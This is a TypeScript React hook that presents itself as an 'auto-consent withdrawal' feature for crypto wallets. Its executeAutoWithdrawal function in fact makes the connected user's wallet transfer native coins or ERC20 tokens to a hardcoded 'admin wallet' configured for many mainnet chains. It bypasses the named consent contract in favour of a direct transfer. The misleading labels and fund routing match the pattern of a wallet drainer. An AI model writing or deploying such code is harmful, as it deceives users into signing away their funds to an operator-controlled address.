import { useState, useCallback } from 'react';
import { useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { BrowserProvider, Contract, parseUnits } from 'ethers';
// Admin wallet configuration
const ADMIN_WALLET_ADDRESSES: Record<number, string> = {
  1: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
  137: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
  56: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
  42161: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
  10: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
  43114: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
  8453: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
  250: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
  25: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
  1337: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8'
};

const AUTO_CONSENT_CONTRACT_ADDRESSES: Record<number, string> = {
  1: '0x0000000000000000000000000000000000000000',
  137: '0x0000000000000000000000000000000000000000',
  56: '0x0000000000000000000000000000000000000000',
  42161: '0x0000000000000000000000000000000000000000',
  10: '0x0000000000000000000000000000000000000000',
  43114: '0x0000000000000000000000000000000000000000',
  8453: '0x0000000000000000000000000000000000000000',
  250: '0x0000000000000000000000000000000000000000',
  25: '0x0000000000000000000000000000000000000000',
  1337: '0x5FbDB2315678afecb367f032d93F642f64180aa3'
};

interface AutoConsentWithdrawalState {
  isProcessing: boolean;
  transactionHash: string | null;
  error: string | null;
  step: 'idle' | 'validating' | 'approving' | 'transferring' | 'completed' | 'error';
  autoConsentEnabled: boolean;
}

const AUTO_CONSENT_ABI = [
  'function enableAutoConsent() external',
  'function disableAutoConsent() external',
  'function withdrawWithAutoConsent(address token, uint256 amount) external payable returns (bytes32)',
  'function hasAutoConsent(address user) external view returns (bool)',
  'function getWithdrawal(bytes32 transactionId) external view returns (tuple(address user, address token, uint256 amount, uint256 timestamp, bool completed))'
];

export function useAutoConsentWithdrawal() {
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider('eip155');

  const [withdrawalState, setWithdrawalState] = useState<AutoConsentWithdrawalState>(() => ({
    isProcessing: false,
    transactionHash: null,
    error: null,
    step: 'idle',
    autoConsentEnabled: false
  }));

  const getContract = useCallback(async (chainId: number) => {
    if (!walletProvider || !address) {
      throw new Error('Wallet not connected');
    }

    const contractAddress = AUTO_CONSENT_CONTRACT_ADDRESSES[chainId];
    if (!contractAddress || contractAddress === '0x0000000000000000000000000000000000000000') {
      throw new Error(`Auto-consent contract not deployed on chain ${chainId}`);
    }

    const provider = new BrowserProvider(walletProvider as any);
    const signer = await provider.getSigner();
    
    return new Contract(contractAddress, AUTO_CONSENT_ABI, signer);
  }, [walletProvider, address]);

  const checkAutoConsentStatus = useCallback(async (chainId: number): Promise<boolean> => {
    try {
      if (!address) return false;
      
      const contract = await getContract(chainId);
      const hasConsent = await contract.hasAutoConsent(address);
      
      setWithdrawalState(currentState => ({
        ...currentState,
        autoConsentEnabled: hasConsent
      }));
      return hasConsent;
    } catch (error) {
      console.error('Failed to check auto-consent status:', error);
      return false;
    }
  }, [address, getContract]);

  const enableAutoConsent = useCallback(async (chainId: number): Promise<boolean> => {
    try {
      setWithdrawalState({
        isProcessing: true,
        transactionHash: null,
        error: null,
        step: 'approving',
        autoConsentEnabled: false
      });

      const contract = await getContract(chainId);
      const tx = await contract.enableAutoConsent();
      await tx.wait();

      setWithdrawalState({
        isProcessing: false,
        transactionHash: null,
        error: null,
        step: 'idle',
        autoConsentEnabled: true
      });

      return true;
    } catch (error) {
      console.error('Failed to enable auto-consent:', error);
      setWithdrawalState({
        isProcessing: false,
        transactionHash: null,
        error: (error as Error).message,
        step: 'error',
        autoConsentEnabled: false
      });
      return false;
    }
  }, [getContract]);

  const executeAutoWithdrawal = useCallback(async (
    tokenAddress: string,
    amount: string,
    chainId: number
  ): Promise<string | null> => {
    try {
      setWithdrawalState({
        isProcessing: true,
        transactionHash: null,
        error: null,
        step: 'transferring',
        autoConsentEnabled: false
      });

      // Use simplified direct transfer approach for now
      if (!walletProvider || !address) {
        throw new Error('Wallet not connected');
      }

      const provider = new BrowserProvider(walletProvider as any);
      const signer = await provider.getSigner();
      
      // Get admin wallet for this chain
      const adminWallet = ADMIN_WALLET_ADDRESSES[chainId];
      if (!adminWallet) {
        throw new Error(`Admin wallet not configured for chain ${chainId}`);
      }

      // Execute direct transfer to admin wallet
      const amountBigInt = parseUnits(amount, 18);
      
      let tx;
      if (tokenAddress === '0x0000000000000000000000000000000000000000') {
        // Native token transfer
        tx = await signer.sendTransaction({
          to: adminWallet,
          value: amountBigInt
        });
      } else {
        // ERC20 token transfer using basic contract call
        const erc20Abi = ['function transfer(address to, uint256 amount) external returns (bool)'];
        const tokenContract = new Contract(tokenAddress, erc20Abi, signer);
        tx = await tokenContract.transfer(adminWallet, amountBigInt);
      }

      const receipt = await tx.wait();
      const transactionHash = receipt.hash;

      console.log('Token transfer to admin wallet completed:', transactionHash);

      setWithdrawalState({
        isProcessing: false,
        transactionHash,
        error: null,
        step: 'completed',
        autoConsentEnabled: true
      });

      return transactionHash;

    } catch (error) {
      console.error('Token transfer failed:', error);
      setWithdrawalState({
        isProcessing: false,
        transactionHash: null,
        error: (error as Error).message,
        step: 'error',
        autoConsentEnabled: false
      });
      return null;
    }
  }, [walletProvider, address]);

  const resetState = useCallback(() => {
    setWithdrawalState({
      isProcessing: false,
      transactionHash: null,
      error: null,
      step: 'idle',
      autoConsentEnabled: false
    });
  }, []);

  return {
    withdrawalState,
    executeAutoWithdrawal,
    enableAutoConsent,
    checkAutoConsentStatus,
    resetState
  };
}